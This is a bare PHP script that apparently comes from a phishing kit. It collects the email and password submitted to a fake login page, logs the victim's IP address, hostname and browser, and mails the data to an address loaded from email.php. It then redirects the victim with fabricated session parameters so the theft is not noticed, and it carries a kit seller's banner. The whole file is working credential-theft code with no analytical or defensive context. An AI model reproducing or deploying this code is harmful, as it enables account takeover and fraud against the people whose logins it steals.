<?php
if($_POST["em"] != "" and $_POST["ps"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['em']."\n";
$message .= "Password:  ".$_POST['ps']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
include 'email.php';
$subject = "Login | $ip";
{
mail("$to", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: go.php?cmd=login_submit&id=$praga$praga&session=$praga$praga&email=".$_POST['em']);
}else{
header ("Location: index.php");
}

?>